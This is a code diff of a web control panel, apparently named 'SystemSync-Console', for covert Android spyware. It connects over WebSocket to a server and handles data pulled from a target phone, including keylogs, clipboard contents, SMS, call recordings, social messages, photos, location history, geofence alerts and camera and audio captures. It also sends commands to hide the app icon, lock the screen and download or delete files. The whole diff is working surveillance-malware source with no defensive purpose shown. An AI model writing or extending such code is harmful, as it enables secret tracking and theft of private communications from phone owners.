             case 'KEYLOG_CLEARED':
                 showNotification('Keylog cleared');
+                pendingCommand = null;
                 break;
+                
             case 'CLIPBOARD_DATA':
-                displayClipboard(parseData(json.data));
+                try {
+                    const clipData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayClipboard(clipData);
+                } catch (e) {
+                    displayClipboard({ content: json.data });
+                }
                 pendingCommand = null;
                 break;
+                
             case 'WIFI_NETWORKS_DATA':
-                displayWifiNetworks(parseData(json.data));
+                try {
+                    const wifiData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayWifiNetworks(wifiData);
+                } catch (e) {
+                    console.error('WiFi parse error:', e);
+                }
                 pendingCommand = null;
                 break;
+                
             case 'GEOFENCE_SET':
                 showNotification('✅ Geofence activated');
+                pendingCommand = null;
                 break;
+                
             case 'GEOFENCE_CLEARED':
                 showNotification('Geofence cleared');
+                pendingCommand = null;
                 break;
-            case 'GEOFENCE_INFO': {
-                const gfInfo = json.data;
-                if (gfInfo && gfInfo.active) {
-                    panel.innerHTML = '<h3>🗺️ Geofence Active</h3><p>📍 ' + gfInfo.lat.toFixed(5) + ', ' + gfInfo.lon.toFixed(5) + '</p><p>📏 Radius: ' + gfInfo.radius + 'm</p>';
-                } else {
-                    panel.innerHTML = '<h3>🗺️ Geofence</h3><p style="color:#999">No active geofence.</p>';
+                
+            case 'GEOFENCE_INFO':
+                try {
+                    const gfInfo = json.data;
+                    if (gfInfo && gfInfo.active) {
+                        panel.innerHTML = '<h3>🗺️ Geofence Active</h3><p>📍 ' + parseFloat(gfInfo.lat).toFixed(5) + ', ' + parseFloat(gfInfo.lon).toFixed(5) + '</p><p>📏 Radius: ' + gfInfo.radius + 'm</p>';
+                    } else {
+                        panel.innerHTML = '<h3>🗺️ Geofence</h3><p style="color:#999">No active geofence.</p>';
+                    }
+                } catch (e) {
+                    console.error('Geofence info error:', e);
                 }
+                pendingCommand = null;
                 break;
-            }
-            case 'GEOFENCE_ALERT': {
+                
+            case 'GEOFENCE_ALERT':
                 const gfMsg = json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone';
                 pushAlert('Geofence', gfMsg);
                 showNotification(gfMsg);
+                pendingCommand = null;
                 break;
-            }
+                
             case 'SCHEDULED_CAPTURE_SET':
                 showNotification('✅ Auto-capture started');
+                pendingCommand = null;
                 break;
+                
             case 'SCHEDULED_CAPTURE_STOPPED':
                 showNotification('Auto-capture stopped');
+                pendingCommand = null;
                 break;
+                
             case 'DEVICE_LOCKED':
                 showNotification('🔒 Screen locked');
+                pendingCommand = null;
                 break;
+                
             case 'SMS_SENT':
                 showNotification('✅ SMS sent successfully');
+                pendingCommand = null;
                 break;
+                
             case 'FILE_DELETED':
                 showNotification('File deleted');
                 sendCommand('LIST_FILES', { path: currentPath });
+                pendingCommand = null;
                 break;
+                
             case 'VIBRATE_COMPLETE':
                 showNotification('📳 Vibrated');
+                pendingCommand = null;
                 break;
+                
             case 'UNINSTALL_INITIATED':
                 showNotification('Uninstall initiated');
+                pendingCommand = null;
                 break;
+                
             case 'APP_OPENED':
                 showNotification('App opened');
+                pendingCommand = null;
                 break;
-            case 'GPS_UPDATES_STOPPED': {
+                
+            case 'GPS_UPDATES_STOPPED':
                 liveGpsActive = false;
                 const gpsBtn = document.getElementById('liveGpsBtn');
                 if (gpsBtn) {
@@ -1213,105 +1509,235 @@ modalVideo.addEventListener("loadedmetadata", () => {
                     gpsBtn.style.cssText = '';
                 }
                 showNotification('GPS tracking stopped');
+                pendingCommand = null;
                 break;
-            }
+                
+            // Feature 1: Social Messages
+            case 'SOCIAL_MESSAGES_DATA':
+                try {
+                    const socialData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displaySocialMessages(socialData);
+                } catch (e) {
+                    console.error('Social messages parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            case 'NOTIFICATION_LIVE':
+                pushLiveNotification(json);
+                pendingCommand = null;
+                break;
+                
+            // Feature 2: Call Recordings
+            case 'CALL_RECORDINGS_DATA':
+                try {
+                    const recData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayCallRecordings(recData);
+                } catch (e) {
+                    console.error('Call recordings parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            case 'CALL_AUDIO_DATA':
+                try {
+                    const audioData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    if (audioData && audioData.audio) playCallRecording(audioData);
+                } catch (e) {
+                    console.error('Call audio parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            case 'CALL_ALERT':
+                handleCallAlert(json);
+                pendingCommand = null;
+                break;
+                
+            // Feature 3: Photo Gallery
+            case 'RECENT_IMAGES_DATA':
+                try {
+                    const imgData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayPhotoGallery(imgData);
+                } catch (e) {
+                    console.error('Images parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            case 'IMAGE_DATA':
+                try {
+                    const imgData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    if (imgData && imgData.image) showFullImage(imgData.image, imgData.mediaId);
+                } catch (e) {
+                    console.error('Image data parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            // Feature 7: Location History
+            case 'LOCATION_HISTORY_DATA':
+                try {
+                    const locData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayLocationHistory(locData);
+                } catch (e) {
+                    console.error('Location history parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            // Feature 5+6: App Events
+            case 'APP_EVENTS_DATA':
+                try {
+                    const eventsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displayAppEvents(eventsData);
+                } catch (e) {
+                    console.error('App events parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            case 'APP_INSTALLED':
+                pushAlert('📱 App Installed', (json.name || json.pkg));
+                showNotification('📱 Installed: ' + (json.name || json.pkg));
+                pendingCommand = null;
+                break;
+                
+            case 'APP_REMOVED':
+                pushAlert('🗑️ App Removed', (json.name || json.pkg));
+                showNotification('🗑️ Removed: ' + (json.name || json.pkg));
+                pendingCommand = null;
+                break;
+                
+            // Feature 8: SMS Keywords
+            case 'SMS_KEYWORDS_SET':
+                showNotification('✅ Keywords saved');
+                pendingCommand = null;
+                break;
+                
+            case 'SMS_KEYWORDS_DATA':
+                try {
+                    const kwData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displaySmsKeywords(kwData);
+                } catch (e) {
+                    console.error('Keywords parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            case 'SMS_KEYWORDS_CLEARED':
+                showNotification('Keywords cleared');
+                pendingCommand = null;
+                break;
+                
+            case 'SMS_ALERTS_DATA':
+                try {
+                    const alertsData = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                    displaySmsAlerts(alertsData);
+                } catch (e) {
+                    console.error('SMS alerts parse error:', e);
+                }
+                pendingCommand = null;
+                break;
+                
+            case 'SMS_KEYWORD_ALERT':
+                pushAlert('🔑 Keyword: ' + json.keyword,
+                    'From ' + json.from + ': ' + json.body);
+                showNotification('🔑 "' + json.keyword + '" from ' + json.from);
+                pendingCommand = null;
+                break;
+                
+            // Device registration
+            case 'DEVICE_REGISTRATION':
+                currentDeviceId = json.deviceId;
+                showNotification('Device registered: ' + (json.name || json.deviceId));
+                break;
+                
+            // Heartbeat
+            case 'HEARTBEAT':
+                // Ignore
+                break;
+                
             default:
                 console.log('Unhandled JSON type:', json.type);
-                // If we have a pending command, try to infer the response format
-                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
-                    dataType = 'file';
-                    currentData = json;
-                    renderFiles();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
-                    dataType = 'sms';
-                    currentData = json;
-                    renderTable();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
-                    dataType = 'call';
-                    currentData = json;
-                    renderTable();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
-                    renderMap(json);
-                    pendingCommand = null;
-                }
                 break;
         }
     }
 
+    // ---------- PLAIN TEXT HANDLER ----------
     function handlePlainText(msg) {
+        console.log('Plain text received:', msg);
+        
         if (msg.startsWith("STATUS:")) {
             setStatus(msg.substring(7));
             pendingCommand = null;
+            
         } else if (msg.startsWith("LOC_DATA:")) {
             try {
                 const data = JSON.parse(msg.substring(9));
                 renderMap(data);
                 pendingCommand = null;
             } catch (err) { console.error(err); }
-        } else if (msg.startsWith("FILE_LIST:")) {
+        } 
+            
+     else if (msg.startsWith("SMS_DATA:")) {
             try {
-                currentData = JSON.parse(msg.substring(10));
-                dataType = 'file';
-                renderFiles();
-                pendingCommand = null;
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("SMS_DATA:")) {
-            try {
-                currentData = JSON.parse(msg.substring(9));
+                const data = JSON.parse(msg.substring(9));
+                currentData = data;
                 dataType = 'sms';
                 renderTable();
                 pendingCommand = null;
             } catch (err) { console.error(err); }
+            
         } else if (msg.startsWith("CALL_DATA:")) {
             try {
-                currentData = JSON.parse(msg.substring(10));
+                const data = JSON.parse(msg.substring(10));
+                currentData = data;
                 dataType = 'call';
                 renderTable();
-                pendingCommand = null;
+                pendingCommand =null;
             } catch (err) { console.error(err); }
+            
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
             const base64 = msg.substring(13);
             displayCapturedImage(base64);
             pendingCommand = null;
+            
         } else if (msg.startsWith("AUDIO_RECORDING:")) {
             showAudio(msg.substring(16));
             pendingCommand = null;
-        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
-            screenActive = true;
-            document.getElementById('screenBtn').innerText = 'Stop Screen';
-            showNotification('Screen share started');
+            
+        }  else if (msg.startsWith("FLASH_ON")) {
+            // This case may not be used if the device sends JSON, but keep for safety
+            flashOn = true;
+            document.getElementById('flashBtn').innerText = 'Flash Off';
+            showNotification('🔦 Flashlight ON');
             pendingCommand = null;
-        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
-            screenActive = false;
-            document.getElementById('screenBtn').innerText = 'Start Screen';
-            if (screenPC) { screenPC.close(); screenPC = null; }
-            showNotification('Screen share stopped');
+            
+        } else if (msg.startsWith("FLASH_OFF")) {
+            flashOn = false;
+            document.getElementById('flashBtn').innerText = 'Flash On';
+            showNotification('🔦 Flashlight OFF');
             pendingCommand = null;
-        } else if (msg.startsWith("APP_HIDDEN")) {
-            iconHidden = true;
-            document.getElementById('iconBtn').innerText = 'Show Icon';
-            showNotification('App icon hidden');
+            
+        } else if (msg.startsWith("FLASH_TIMED")) {
+            showNotification('⏱️ Flash timed complete');
             pendingCommand = null;
-        } else if (msg.startsWith("APP_SHOWN")) {
-            iconHidden = false;
-            document.getElementById('iconBtn').innerText = 'Hide Icon';
-            showNotification('App icon shown');
+            
+        } else if (msg.startsWith("FLASH_BLINK")) {
+            showNotification('✨ Flash blink complete');
             pendingCommand = null;
+            
         } else if (msg.startsWith("VIBRATE_DONE")) {
             showNotification('Vibration done');
             pendingCommand = null;
+            
         } else if (msg.startsWith("ERROR:")) {
-            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
+            panel.innerHTML = `<div style="color:#d32f2f;">❌ Error: ${msg.substring(6)}</div>`;
             pendingCommand = null;
-        } else if (msg.startsWith("FILE_DATA:")) {
-            const base64 = msg.substring(10);
-            downloadBase64(base64, 'downloaded_file');
-            pendingCommand = null;
+        } else if (msg.startsWith("I_AM_DEVICE")) {
+            console.log('Device identified');
         } else if (msg.startsWith('[') || msg.startsWith('{')) {
-            // Try to parse as JSON (raw response from device)
             try {
                 const parsed = JSON.parse(msg);
                 handleJSON(parsed);
@@ -1323,6 +1749,83 @@ modalVideo.addEventListener("loadedmetadata", () => {
         }
     }
 
+    // ---------- MESSAGE HANDLER ----------
+    function handleIncomingMessage(msg) {
+        try {
+            const json = JSON.parse(msg);
+            if (json.type === 'SIGNALING') {
+                handleSignalingMessage(json.data);
+            } else {
+                handleJSON(json);
+            }
+        } catch (e) {
+            handlePlainText(msg);
+        }
+    }
+
+    // ---------- WEBSOCKET CONNECTION ----------
+    function connectWebSocket() {
+        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
+            console.log('already connecting/open');
+            return;
+        }
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
+        setStatus('CONNECTING');
+        if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
+        panel.innerHTML = '⏳ Connecting to server...';
+
+        ws = new WebSocket(WS_URL);
+        ws.onopen = () => {
+            console.log('WebSocket connected');
+            reconnectAttempts = 0;
+            ws.send('I_AM_WEB');
+            setStatus('ONLINE');
+            panel.innerHTML = '✅ Connected to server. Ready.';
+            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE';
+        };
+        ws.onmessage = (e) => {
+            console.log('RAW message:', e.data.substring(0, 100));
+            handleIncomingMessage(e.data);
+        };
+        ws.onclose = (ev) => {
+            console.log('WebSocket closed', ev.reason);
+            setStatus('OFFLINE');
+            if (wsDebug) wsDebug.innerText = `🌐 WebSocket: closed (${ev.reason})`;
+            panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.';
+            ws = null;
+
+            const delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), MAX_RECONNECT_DELAY);
+            reconnectAttempts++;
+            if (reconnectTimer) clearTimeout(reconnectTimer);
+            reconnectTimer = setTimeout(() => {
+                console.log('Reconnecting...');
+                connectWebSocket();
+            }, delay);
+        };
+        ws.onerror = (err) => {
+            console.error('WebSocket error:', err);
+            setStatus('ERROR');
+            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error';
+        };
+    }
+
+    function manualReconnect() {
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
+        if (ws) {
+            ws.close();
+            ws = null;
+        }
+        reconnectAttempts = 0;
+        connectWebSocket();
+    }
+
+    // ---------- UI HELPERS ----------
     function setStatus(s) {
         statusEl.innerText = s;
         if (s === 'ONLINE') {
@@ -1334,6 +1837,34 @@ modalVideo.addEventListener("loadedmetadata", () => {
             statusEl.style.background = '#ffebee';
             statusEl.style.color = '#c62828';
         }
+    }
+
+    function showNotification(text) {
+        const orig = statusEl.innerText;
+        statusEl.innerText = text;
+        setTimeout(() => { statusEl.innerText = orig; }, 2000);
+    }
+
+    function pushAlert(title, body) {
+        newAlerts.unshift({ title: title, body: body, time: new Date().toLocaleTimeString() });
+        if (newAlerts.length > 50) newAlerts.pop();
+        const badge = document.getElementById('alertsBadge');
+        const list  = document.getElementById('alertsList');
+        if (!badge || !list) return;
+        badge.style.display = 'block';
+        list.innerHTML = '';
+        newAlerts.forEach(function(a) {
+            const d = document.createElement('div');
+            d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';
+            d.textContent = a.time + ' ' + a.title + ': ' + a.body;
+            list.appendChild(d);
+        });
+    }
+
+    function clearAlerts() {
+        newAlerts.length = 0;
+        const badge = document.getElementById('alertsBadge');
+        if (badge) badge.style.display = 'none';
     }
 
     // ---------- CAMERA UI ----------
@@ -1357,14 +1888,14 @@ modalVideo.addEventListener("loadedmetadata", () => {
 
     function displayCapturedImage(base64) {
         panel.innerHTML = `
-            <img src="data:image/jpeg;base64,${base64}">
+            <img src="data:image/jpeg;base64,${base64}" style="max-width:100%; border-radius:8px;">
             <div style="margin-top:10px;">
-                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
+                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')" style="padding:8px 16px; background:#1976ff; color:#fff; border:none; border-radius:6px; cursor:pointer;">💾 SAVE IMAGE</button>
             </div>
         `;
     }
 
-    // ---------- LIVE STREAM ACTIONS (snapshot/record) ----------
+    // ---------- LIVE STREAM ACTIONS ----------
     function takeSnapshot() {
         const video = document.getElementById('liveCamVideo');
         if (!video || !video.videoWidth) {
@@ -1385,74 +1916,83 @@ modalVideo.addEventListener("loadedmetadata", () => {
         }, 'image/png');
     }
 
-   function toggleRecording() {
-    const video = document.getElementById('liveCamVideo');
-    if (!video || !video.srcObject) {
-        alert('No live stream');
-        return;
-    }
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-        document.getElementById('recordBtn').innerText = 'Record Video';
-    } else {
-        recordedChunks = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const stream = video.srcObject;
-
-        if (video.videoWidth === 0) {
-            video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
+    function toggleRecording() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video || !video.srcObject) {
+            alert('No live stream');
+            return;
+        }
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+            document.getElementById('recordBtn').innerText = 'Record Video';
         } else {
-            startCanvasRecording(video, canvas, ctx, stream);
+            recordedChunks = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const stream = video.srcObject;
+
+            if (video.videoWidth === 0) {
+                video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
+            } else {
+                startCanvasRecording(video, canvas, ctx, stream);
+            }
         }
     }
-}
 
-function startCanvasRecording(video, canvas, ctx, originalStream) {
-    // Swap dimensions for 90° rotation
-    canvas.width = video.videoHeight;
-    canvas.height = video.videoWidth;
+    function startCanvasRecording(video, canvas, ctx, originalStream) {
+        canvas.width = video.videoHeight;
+        canvas.height = video.videoWidth;
 
-    function drawVideoFrame() {
-        ctx.save();
-        ctx.translate(canvas.width / 2, canvas.height / 2);
-        ctx.rotate(90 * Math.PI / 180); // clockwise 90°
-        ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
-                     video.videoWidth, video.videoHeight);
-        ctx.restore();
-        requestAnimationFrame(drawVideoFrame);
+        function drawVideoFrame() {
+            ctx.save();
+            ctx.translate(canvas.width / 2, canvas.height / 2);
+            ctx.rotate(90 * Math.PI / 180);
+            ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
+                         video.videoWidth, video.videoHeight);
+            ctx.restore();
+            requestAnimationFrame(drawVideoFrame);
+        }
+        drawVideoFrame();
+
+        const canvasStream = canvas.captureStream(30);
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+
+        mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+        mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `recording_${Date.now()}.webm`;
+            a.click();
+            URL.revokeObjectURL(url);
+            canvasStream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        document.getElementById('recordBtn').innerText = 'Stop Recording';
     }
-    drawVideoFrame();
 
-    const canvasStream = canvas.captureStream(30);
-    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
-
-    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
-    mediaRecorder.onstop = () => {
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `recording_${Date.now()}.webm`;
-        a.click();
-        URL.revokeObjectURL(url);
-        canvasStream.getTracks().forEach(track => track.stop());
-    };
-    mediaRecorder.start();
-    document.getElementById('recordBtn').innerText = 'Stop Recording';
-}
     // ---------- APP ICON TOGGLE ----------
     function toggleAppIcon() {
         if (iconHidden) sendPlainText('showApp');
         else sendPlainText('hideApp');
     }
 
+    // ---------- FLASH TOGGLE ----------
+    function toggleFlash() {
+        if (flashOn) {
+            sendCommand('FLASH_OFF');
+        } else {
+            sendCommand('FLASH_ON');
+        }
+    }
+
     // ---------- RENDERERS ----------
     function showAudio(base64) {
         panel.innerHTML = `
-            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
-            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
+            <audio controls src="data:audio/3gp;base64,${base64}" style="width:100%;"></audio>
+            <button onclick="downloadBase64('${base64}', 'recording.3gp')" style="margin-top:10px; padding:8px 16px; background:#1976ff; color:#fff; border:none; border-radius:6px;">💾 Download</button>
         `;
     }
 
@@ -1464,31 +2004,37 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
     }
 
     function renderMap(loc) {
-        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
+        // Ensure loc has lat/lon
+        if (!loc || (typeof loc.lat === 'undefined' && typeof loc.latitude === 'undefined')) {
+            panel.innerHTML = '<p style="color:#d32f2f;">Invalid location data received</p>';
+            return;
+        }
+        
+        const lat = loc.lat || loc.latitude;
+        const lon = loc.lon || loc.longitude;
+        const accuracy = loc.accuracy || 10;
+        const provider = loc.provider || 'unknown';
+        
+        panel.innerHTML = '<div id="map" style="position:relative; height:400px;"></div>';
         const mapDiv = document.getElementById('map');
-
+    
         const infoDiv = document.createElement('div');
         infoDiv.className = 'map-info';
         infoDiv.innerHTML = `
-            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
-            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
-            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
+            <div class="coord">📍 ${parseFloat(lat).toFixed(6)}, ${parseFloat(lon).toFixed(6)}</div>
+            <div>🎯 Accuracy: ${parseFloat(accuracy).toFixed(1)} m</div>
+            <div>📡 Provider: ${provider}</div>
             <div class="addr">🌍 Loading address...</div>
         `;
         mapDiv.appendChild(infoDiv);
-
+    
         if (mapInstance) mapInstance.remove();
-        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
+        mapInstance = L.map(mapDiv).setView([lat, lon], 18);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
-
-        const gfBtn = document.createElement('button');
-        gfBtn.textContent = '\u{1F5FA}\uFE0F Set Geofence Here';
-        gfBtn.style.cssText = 'margin-top:8px;padding:5px 12px;background:#4caf50;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px';
-        gfBtn.addEventListener('click', function() { useLocationAsGeofence(loc.lat, loc.lon); });
-        panel.appendChild(gfBtn);
-
-        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
+        L.circle([lat, lon], { radius: accuracy, color: '#1976ff' }).addTo(mapInstance);
+    
+        // Reverse geocoding
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
             headers: { 'User-Agent': 'SystemSync-Console/1.0' }
         })
         .then(response => response.json())
@@ -1500,26 +2046,31 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
             console.error('Geocoding error:', err);
             infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
         });
-    }
+}
 
     function renderTable() {
         if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No data</p>';
+            panel.innerHTML = '<p style="color:#999; padding:20px;">No data available</p>';
             return;
         }
 
         let headers = [], rows = [];
         if (dataType === 'sms') {
             headers = ['Type', 'Number', 'Message', 'Date'];
-            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
+            rows = currentData.map(item => [
+                item.type || (item.type === 1 ? 'Incoming' : 'Outgoing'),
+                item.address || item.number || 'Unknown',
+                item.body || '',
+                item.date || item.timeFmt || ''
+            ]);
         } else if (dataType === 'call') {
             headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
             rows = currentData.map(item => [
-                item.type,
-                item.number,
+                item.type || '',
+                item.number || '',
                 item.name || '',
-                item.date,
-                item.duration + 's'
+                item.date || item.timeFmt || '',
+                item.duration ? item.duration + 's' : ''
             ]);
         } else {
             panel.innerHTML = '<p>Unknown data type</p>';
@@ -1537,7 +2088,7 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
 
         pageRows.forEach(r => {
             html += '<tr>';
-            r.forEach(cell => html += `<td>${cell}</td>`);
+            r.forEach(cell => html += `<td>${cell || ''}</td>`);
             html += '</tr>';
         });
         html += '</tbody></table>';
@@ -1565,12 +2116,16 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
                     <div class="file-toolbar">
                         <button onclick="navigateUp()">⬆ Up</button>
                         <span class="file-path">${currentPath}</span>
-                        <div class="download-selected">
-                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
-                        </div>
-                    </div>
-                </div>
-        `;
+                        <div style="display: flex; gap: 8px;">
+            <button onclick="downloadSelected()" style="flex:1; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                ⬇️ <span id="downloadCount">${selectedFiles.length}</span>
+            </button>
+            <button onclick="deleteSelected()" style="flex:1; background: #d32f2f; color: white; display: flex; align-items: center; justify-content: center; gap: 4px;">
+                🗑️ <span id="deleteCount">${selectedFiles.length}</span>
+            </button>
+        </div>
+    </div>
+`;
 
         if (!currentData || currentData.length === 0) {
             html += '<p style="padding:20px;">No files found.</p>';
@@ -1644,18 +2199,14 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
     }
 
     function updateSelected(checkbox) {
-        const path = checkbox.dataset.path;
-        if (checkbox.checked) {
-            if (!selectedFiles.includes(path)) selectedFiles.push(path);
-        } else {
-            selectedFiles = selectedFiles.filter(p => p !== path);
-        }
-        const downloadBtn = document.querySelector('.download-selected button');
-        if (downloadBtn) {
-            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
-        }
+         const path = checkbox.dataset.path;
+    if (checkbox.checked) {
+        if (!selectedFiles.includes(path)) selectedFiles.push(path);
+    } else {
+        selectedFiles = selectedFiles.filter(p => p !== path);
     }
-
+    updateCounters();  // refresh both button counters
+}
     function downloadSelected() {
         if (selectedFiles.length === 0) {
             alert('No files selected');
@@ -1665,6 +2216,33 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
             sendPlainText('dl ' + path);
         });
     }
+    function deleteSelected() {
+    if (selectedFiles.length === 0) {
+        alert('No files selected');
+        return;
+    }
+
+    const confirmMsg = `Delete ${selectedFiles.length} file(s)? This action cannot be undone.`;
+    if (!confirm(confirmMsg)) return;
+
+    selectedFiles.forEach(path => {
+        // Send DELETE_FILE command with the file path
+        sendCommand('DELETE_FILE', { path: path });
+    });
+
+    // Optionally clear selection after sending (the list will refresh when responses arrive)
+    selectedFiles = [];
+    updateCounters(); // helper to reset both counters
+}
+
+// Helper to update both counters (used also after deletion)
+function updateCounters() {
+    const count = selectedFiles.length;
+    const downloadCountSpan = document.getElementById('downloadCount');
+    const deleteCountSpan = document.getElementById('deleteCount');
+    if (downloadCountSpan) downloadCountSpan.innerText = count;
+    if (deleteCountSpan) deleteCountSpan.innerText = count;
+}
 
     function formatBytes(b) {
         if (b === 0) return '0 B';
@@ -1673,135 +2251,7 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
         return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
     }
 
-    function showNotification(text) {
-        const orig = statusEl.innerText;
-        statusEl.innerText = text;
-        setTimeout(() => { statusEl.innerText = orig; }, 2000);
-    }
-
-    // ---------- WEBSOCKET MESSAGE HANDLER ----------
-    function handleIncomingMessage(msg) {
-        try {
-            const json = JSON.parse(msg);
-            if (json.type === 'SIGNALING') {
-                handleSignalingMessage(json.data);
-            } else {
-                // Assume it's a command response or other JSON
-                handleJSON(json);
-            }
-        } catch (e) {
-            // Not JSON – treat as plain text
-            handlePlainText(msg);
-        }
-    }
-
-    // ---------- WEBSOCKET CONNECTION ----------
-    function connectWebSocket() {
-        if (ws) {
-            ws.close();
-        }
-        setStatus('CONNECTING');
-        ws = new WebSocket(WS_URL);
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            ws.send('I_AM_WEB');
-            setStatus('ONLINE');
-            panel.innerHTML = '✅ Connected to server. Ready.';
-        };
-        ws.onmessage = (e) => {
-            console.log('RAW message:', e.data);
-            handleIncomingMessage(e.data);
-        };
-        ws.onclose = () => {
-            console.log('WebSocket closed');
-            setStatus('OFFLINE');
-            panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
-            ws = null;
-        };
-        ws.onerror = (err) => {
-            console.error('WebSocket error:', err);
-            setStatus('ERROR');
-        };
-    }
-// Add this inside your <script> (after DOM is ready)
-document.querySelectorAll('input[name="clickCameraSelect"]').forEach(radio => {
-    radio.addEventListener('change', function() {
-        const flashCheckbox = document.getElementById('clickFlashCheckbox');
-        const flashLabel = flashCheckbox.closest('.camera-option'); // the container div
-        if (this.value === 'front') {
-            flashLabel.style.display = 'none';
-        } else {
-            flashLabel.style.display = ''; // show again
-        }
-    });
-});
-// Also trigger on page load for initial state
-window.addEventListener('load', () => {
-    const selected = document.querySelector('input[name="clickCameraSelect"]:checked');
-    if (selected && selected.value === 'front') {
-        document.getElementById('clickFlashCheckbox').closest('.camera-option').style.display = 'none';
-    }
-});
-    // ── New global state (no re-declarations — currentPath already declared above) ──
-    let liveGpsActive = false;
-    const newAlerts = [];
-    let appsData = [];
-
